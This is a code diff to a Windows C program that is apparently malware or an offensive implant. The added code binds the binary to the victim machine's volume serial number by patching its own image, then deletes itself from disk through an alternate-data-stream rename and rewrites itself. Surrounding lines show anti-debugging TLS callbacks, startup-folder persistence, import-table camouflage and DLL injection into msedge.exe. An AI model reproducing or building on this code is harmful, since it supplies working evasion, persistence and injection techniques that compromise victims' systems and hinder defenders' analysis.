@@ -51,6 +51,252 @@ EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CAL
 //----------------------------------------------------------------------------------------------------------------
 //----------------------------------------------------------------------------------------------------------------
  
+#include <Winternl.h>
+
+// ========================================================================================================================================
+
+#define INITIAL_VALUE 0x4E554C4C
+
+CONST DWORD g_dwSerialNumberConstVariable = INITIAL_VALUE;
+
+// ========================================================================================================================================
+
+// Function to read self image from disk
+BOOL ReadSelfFromDiskW(IN LPWSTR szLocalImageName, OUT ULONG_PTR* pModule, OUT DWORD* pdwFileSize) {
+
+	HANDLE		hFile = INVALID_HANDLE_VALUE;
+	PBYTE		pFileBuffer = NULL;
+	DWORD		dwFileSize = 0x00,
+		dwNumberOfBytesRead = 0x00;
+
+	// Check if the parameters are valid
+	if (!szLocalImageName || !pModule || !pdwFileSize)
+		return FALSE;
+
+	// Open the file
+	if ((hFile = CreateFileW(szLocalImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Get the file size
+	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
+		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Allocate memory for the file
+	if ((pFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
+		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Read the file
+	if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
+		printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Return the file buffer and the file size
+	*pModule = (ULONG_PTR)pFileBuffer;
+	*pdwFileSize = dwFileSize;
+
+_END_OF_FUNC:
+	if (hFile != INVALID_HANDLE_VALUE)
+		CloseHandle(hFile);
+	if (!*pModule && pFileBuffer)
+		HeapFree(GetProcessHeap(), 0x00, pFileBuffer);
+	return *pModule == NULL ? FALSE : TRUE;
+}
+
+// ========================================================================================================================================
+
+// Function to write self image to disk
+BOOL WriteSelfToDiskW(IN LPWSTR szLocalImageName, IN PVOID pImageBase, IN DWORD sImageSize) {
+
+	HANDLE		hFile = INVALID_HANDLE_VALUE;
+	DWORD		dwNumberOfBytesWritten = 0x00;
+
+	// Check if the parameters are valid
+	if (!szLocalImageName || !pImageBase || !sImageSize)
+		return FALSE;
+
+	// Open the file
+	if ((hFile = CreateFileW(szLocalImageName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Write the file
+	if (!WriteFile(hFile, pImageBase, sImageSize, &dwNumberOfBytesWritten, NULL) || sImageSize != dwNumberOfBytesWritten) {
+		printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+_END_OF_FUNC:
+	if (hFile != INVALID_HANDLE_VALUE)
+		CloseHandle(hFile);
+	return dwNumberOfBytesWritten == sImageSize ? TRUE : FALSE;
+}
+
+// ========================================================================================================================================
+
+// Structure for File Deletion
+typedef struct _FILE_RENAME_INFO2 {
+#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
+	union {
+		BOOLEAN ReplaceIfExists;
+		DWORD Flags;
+	} DUMMYUNIONNAME;
+#else
+	BOOLEAN ReplaceIfExists;
+#endif
+	HANDLE RootDirectory;
+	DWORD FileNameLength;
+	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[1]" (See FILE_RENAME_INFO's original documentation)
+} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;
+
+// Function to delete file image from disk
+BOOL DeleteSelfFromDiskW(IN LPCWSTR szFileName) {
+
+	BOOL						bResult = FALSE;
+	HANDLE                      hFile = INVALID_HANDLE_VALUE;
+	FILE_DISPOSITION_INFO       DisposalInfo = { .DeleteFile = TRUE };
+	FILE_RENAME_INFO2			RenameInfo = { .FileNameLength = sizeof(L":%x%x\x00"), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };
+
+	// Check if the parameters are valid
+	if (!szFileName)
+		return FALSE;
+
+	// Generate a random name
+	swprintf(RenameInfo.FileName, MAX_PATH, L":%x%x\x00", rand(), rand() * rand());
+
+	// Open the file
+	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Rename the file
+	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
+		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Close the handle
+	CloseHandle(hFile);
+
+	// Open the file again
+	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Delete the file
+	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
+		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	// Set the result to TRUE
+	bResult = TRUE;
+
+_END_OF_FUNC:
+	if (hFile != INVALID_HANDLE_VALUE)
+		CloseHandle(hFile);
+	return bResult;
+}
+
+
+// ========================================================================================================================================
+
+// Function to Enable DRM
+BOOL IsSameMachine() {
+
+	BOOL					bResult = FALSE;
+	LPWSTR					szLocalImage = NULL;
+	ULONG_PTR				uModule = NULL,
+		                    uMachineSerialVA = NULL;
+	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
+	PIMAGE_SECTION_HEADER	pImgSec = NULL;
+	DWORD					dwSerialNumber = 0x00,
+		                    dwFileSize = 0x00;
+
+	// Get the volume serial number
+	if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
+		printf("[!] GetVolumeInformationW Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Print the serial number
+	printf("[i] New Volume Serial Number: 0x%0.4X\n", dwSerialNumber);
+	printf("[i] Old Volume Serial Number: 0x%0.4X\n", g_dwSerialNumberConstVariable);
+
+	// Same machine (Already patched)
+	if (g_dwSerialNumberConstVariable == dwSerialNumber) {
+		printf("[*] Same Machine \n");
+		return TRUE;
+	}
+
+	// Serial Number is not the same as the initial value or the runtime-serial number (dwSerialNumber)
+	if (g_dwSerialNumberConstVariable != INITIAL_VALUE) {
+		printf("[!] Different Machine \n");
+		return FALSE;
+	}
+
+	// g_dwSerialNumberConstVariable is equal to 'INITIAL_VALUE', then we patch it:
+	printf("[i] First Time Running, Patching Image ... \n");
+
+	// Read local image
+	szLocalImage = (LPWSTR)(((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer);
+	if (!ReadSelfFromDiskW(szLocalImage, &uModule, &dwFileSize))
+		goto _FUNC_CLEANUP;
+
+	// Fetch the Nt Headers
+	pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		goto _FUNC_CLEANUP;
+
+	// Fetch the value of the 'g_dwSerialNumberConstVariable' variable inside the .rdata section
+	pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
+	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {
+
+		// Check if the section name is '.rdata'
+		if (*(ULONG*)pImgSec[i].Name == 'adr.') {
+
+			// Search for the serial number
+			for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)) {
+
+				// If the value is equal to the 'g_dwSerialNumberConstVariable'
+				if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
+					uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
+			}
+		}
+	}
+
+	// If fetched
+	if (uMachineSerialVA != 0x00) {
+
+		// Patch it with the serial number
+		*(DWORD*)uMachineSerialVA = dwSerialNumber;
+
+		// Delete old image from disk
+		if (!DeleteSelfFromDiskW(szLocalImage))
+			goto _FUNC_CLEANUP;
+
+		// Write the new version (patched)
+		if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
+			goto _FUNC_CLEANUP;
+
+		bResult = TRUE;
+	}
+
+
+_FUNC_CLEANUP:
+	if (uModule != NULL)
+		HeapFree(GetProcessHeap(), 0x00, uModule);
+	return bResult;
+}
 
 // Function to move the current running binary to the startup folder
 BOOL MoveToStartup() {
@@ -238,6 +484,8 @@ int main() {
 	// Camoflage the IAT
 	IATCamoflage2();
 
+	// Enable DRM
+	IsSameMachine();
 	// Hardcoded process name
 	wchar_t szProcessName[] = L"msedge.exe";
 
@@ -284,6 +532,10 @@ int main() {
 	}
 
 	printf("[+] DLL injected successfully\n");
+
+	// To delete
+	printf("[*] Press any key to exit\n");
+	getchar();
 
 	// Close the handle to the process
 	CloseHandle(hProcess);
